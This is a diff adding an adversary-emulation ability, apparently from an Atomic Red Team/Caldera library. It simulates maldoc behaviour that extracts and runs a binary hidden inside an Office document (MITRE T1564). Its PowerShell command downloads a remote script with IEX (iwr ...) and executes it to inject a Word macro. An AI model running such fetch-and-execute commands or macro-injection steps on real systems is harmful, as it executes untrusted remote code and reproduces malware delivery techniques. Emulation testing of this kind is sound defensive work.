@@ -1,0 +1,30 @@
+---
+- id: b7f89af9214876eae185527350ca034f
+  name: Extract binary files via VBA
+  description: "This module extracts a binary (calc.exe) from inside of another binary.\
+    \ \n\nIn the wild maldoc authors will use this technique to hide binaries inside\
+    \ of files stored \nwithin the office document itself. An example of this technique\
+    \ can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\
+    \nThis sample contains a document inside of itself. Document 1 is the actual maldoc\
+    \ itself, document 2\nis the same document without all the malicious code. Document\
+    \ 1 will copy Document 2 to the file system\nand then \"peek\" inside of this\
+    \ document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin\
+    \ file is a payload that is parsed out and executed on the file system.\n"
+  tactic: stealth
+  technique:
+    attack_id: T1564
+    name: Hide Artifacts
+  platforms:
+    windows:
+      psh:
+        command: $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt");
+          $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin";
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroCode "$macro" -officeProduct "Word"
+          -sub "Extract" -NoWrap
+        payloads: []
+        cleanup: Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
